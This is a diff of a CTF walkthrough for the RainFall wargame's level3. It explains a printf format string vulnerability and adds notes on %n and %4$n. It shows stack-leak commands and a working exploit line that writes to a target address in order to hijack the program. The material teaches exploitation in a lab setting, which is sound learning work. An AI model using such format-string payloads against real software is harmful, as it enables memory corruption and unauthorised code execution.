@@ -22,16 +22,22 @@ $ cat /home/user/level3/.pass
 Then it calls printf() directly with the user input as the format string — this introduces a format string vulnerability.
 
 another way :
-We leak the stack using "%x" to find where our input lands on the stack, so that we can insert an address like 0x804988c into our input, and printf will read that address as a pointer to write to via %n
+We leak the stack using "\%x" to find where our input lands on the stack, so that we can insert an address like 0x804988c into our input, and printf will read that address as a pointer to write to via %n
 
 python -c 'print "aaaa %x %x %x %x %x %x %x %x %x %x"'
 output:
 aaaa 200 b7fd1ac0 b7ff37d0 61616161 ...
 
-You see 61616161 (which is 'aaaa'), that tells you where in the stack your input lands. If 'aaaa' shows up at the 4th %x, then your input is the 4th argument on the stack.
+You see 61616161 (which is 'aaaa'), that tells you where in the stack your input lands. If 'aaaa' shows up at the 4th \%x, then your input is the 4th argument on the stack.
 
 address of m : 4 bytes
 pad of arbitrary data : 60 bytes
+
+\%n is a format specifier in printf that tells printf to write the number of characters printed so far into the memory location pointed to by the corresponding argument.
+
+\%4$n means:
+1.Look at the 4th argument on the stack (passed to printf) and treat that argument as a pointer to an integer.
+2.Write the number of characters printed so far into the memory location pointed to by that 4th argument.
 
 level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/exploit
 level3@RainFall:~$ cat /tmp/exploit - | ./level3
